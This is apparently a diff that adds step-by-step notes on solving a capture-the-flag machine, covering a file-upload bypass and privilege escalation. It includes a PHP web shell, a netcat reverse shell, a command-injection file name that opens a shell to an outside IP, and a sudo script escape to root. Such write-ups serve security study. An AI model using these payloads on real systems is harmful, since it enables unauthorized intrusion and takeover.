@@ -1,0 +1,29 @@
+Step 1: (Scanning)
+- Machine connect/ machine revert to ensure all services are working
+
+Step 2 (Enumeration)
+- nmap shows port 80
+- gobuster shows /backup/ directory
+- downloading backup.tar/ unzipping
+- files are subdirectories of web server with code used to host them
+- file called upload.php shows upload page for file types: .jpg, .png, .gif, .jpeg
+- using burp we upload a php script with '<?php system($_GET['hello']); ?>' with extention php and try different extentions
+- adding the file type 'GIF8;' to the script upload and extention hello.php.gif allows upload
+- opening the image in browser we can add '?hello=whoami' which executes bash specified in the php file meaning we are running php.
+
+Step 3 (Gaining access)
+- back to burp we use repeater to intercept the php code execution and add a bash shell from pentestMonkey and URL encode using 'ctrl + u' in burp
+- set up a nc listener and listen for reverse shell
+
+Step 4 (Priviledge escalation)
+- going into the guly directory we find a crontab.guly which runs a check_attack.php script
+- checking the check_attack.php script we see it runs 'exec' to the value of file name in order to delete and move files in the event of an attack.
+- we are able to write a file with the name that is ran in php as a method of command injection
+- we write a file called ';nc -c bash 10.10.14.33 121;.php' this is ran when crontab runs the script which attempts to delete and move the files in the event of an atack and runs our command injection instead.
+- doing this we move from apache to user
+- running 'sudo -l' we see user can run /usr/local/sbin/changename.sh as root
+- reading the file we can see it runs an edit to the script '/etc/sysconfig/network-scripts/ifcfg-guly'
+- the script is a bash script which we can then escape and run bash commands during edit.
+- typing bash into any field will cause a root process to open a bash session.
+
+Step 5 (pilfering)
